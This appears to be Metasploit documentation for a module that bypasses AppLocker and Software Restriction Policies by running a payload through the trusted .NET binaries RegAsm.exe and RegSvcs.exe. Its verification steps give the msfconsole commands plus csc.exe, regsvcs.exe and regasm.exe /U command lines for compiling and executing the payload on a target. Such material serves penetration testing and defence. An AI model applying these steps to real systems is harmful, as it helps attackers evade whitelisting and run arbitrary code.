## Intro

This module is designed to evade solutions such as software restriction policies and Applocker.
Applocker in its default configuration will block code in the form of executables (.exe and .com, .msi), scripts (.ps1, .vbs, .js) and dll's from running in user controlled directories.
Applocker enforces this by employing whitelisting, in that code can only be run from the protected directories and sub directories of "Program Files" and "Windows"
The main vector for this bypass is to use the trusted binaries RegAsm.exe or RegSvcs.exe to execute user supplied code as these binaries are located within the trusted Windows directory.

## Vulnerable Application

This evasion will work on all versions of Windows that include .NET versions 3.5 or greater that has solutions such as Applocker or Software Restriction Policies active, that do not explicitly block RegAsm.exe, RegSvcs.exe or the "Microsoft.Net" directory.

## Options

- **TXT_FILE** - Filename for the evasive file (default: regasm_regsvcs.txt).
- **SNK_FILE** - Filename for the .snk file (default: key.snk). (note: to aid furter evasion it is recommended to create your own .snk file ref: https://docs.microsoft.com/en-us/dotnet/framework/app-domains/how-to-sign-an-assembly-with-a-strong-name)

## Verification Steps

  1. Start `msfconsole`
  2. Do: `use evasion/windows/applocker_evasion_regasm_regsvcs`
  3. Do: `set PAYLOAD <payload>`
  4. Do: `run`
  5. The module will now display instructions of how to proceed
  6. `[+] regasm_regsvcs.txt stored at /root/.msf4/local/regasm_regsvcs.txt`
  7. `[+] key.snk stored at /root/.msf4/local/key.snk`
  8. `[*] Copy regasm_regsvcs.txt and key.snk to the target`
  9. `[*] Compile using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regasm_regsvcs.dll /keyfile:key.snk regasm_regsvcs.txt` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").
  10. `[*] Execute using: C:\Windows\Microsoft.NET\Framework64\[.NET Version]\regsvcs.exe regasm_regsvcs.dll` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").
  11. `[*] or`
  12. `[*] Execute using: C:\Windows\Microsoft.NET\Framework64\[.NET Version]\regasm.exe /U regasm_regsvcs.dll` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").

## References

https://attack.mitre.org/techniques/T1121/
